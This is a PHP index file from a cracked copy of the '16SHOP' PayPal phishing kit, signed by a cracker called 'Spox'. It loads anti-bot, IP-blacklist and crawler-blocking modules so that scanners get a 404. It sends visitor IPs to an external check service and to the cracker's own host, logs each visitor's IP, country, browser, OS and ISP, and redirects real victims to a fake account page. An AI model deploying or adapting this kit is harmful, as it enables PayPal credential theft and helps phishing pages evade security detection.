<?php
session_start();

/**
 * 16SHOP PAYPAL CRACKED BY SPOX
 * icq & telegram = @spoxcoder
 
###############################################
#$            CRACKED by Spox_dz             $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 16SHOP            $#
###############################################

**/

require_once 'main.php';
include'Spox/Anti/Dila_DZ.php';
include'Spox/Functions/Fuck-you.php'; 
require_once 'antibot.php';
include'Spox/spox_config.php';
require_once 'blacklist.php';
include'Spox/Anti/IP-BlackList.php';  
require_once 'blocker.php';
require_once 'crawlerdetect.php';
include'Spox/Anti/Bot-Spox.php';
require_once 'onetime.php';
include'Spox/Anti/Bot-Crawler.php';
require_once 'proxyblock.php';

 if ($redirection=="yes") {
	if (isset($_GET['id'])) {
	 $id = isset($_GET['id']) ? trim(htmlentities($_GET['id'])):'';
	  if ($id !== $redirect) {
	  	exit(header("HTTP/1.0 404 Not Found"));
	  }
	}else{
		exit(header("HTTP/1.0 404 Not Found"));
	}
  }


if ($spox_protection=="yes") {

		$ch=curl_init(); 
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://api.iptrooper.net/check/".$_SESSION['ip']."?full=1");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);

		$ch=curl_init(); 
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://spox-coder.info/spox/check_ip.php?ip=".$lp."");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);
		curl_close($ch);

				$check = trim(strip_tags(get_string_between($json,'"bad":',',"')));
				$type = trim(strip_tags(get_string_between($json,'"type":"','"')));

			
			if ($anti_bot=="yes") { if ($check == "true") {	
			$content = "#>".$_SESSION['ip']." [ ".$type." ] - [ ".$_SESSION['country']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
		    $save=fopen("bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

			}
			} 
			tulis_file("result/total_click.txt","$ip|$countrycode|$countryname|$br|$os|$ispuser");
			exit(header("Location: myaccount/?key".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
		
				

	}else{
		header("HTTP/1.0 404 Not Found");exit();	
	}

?>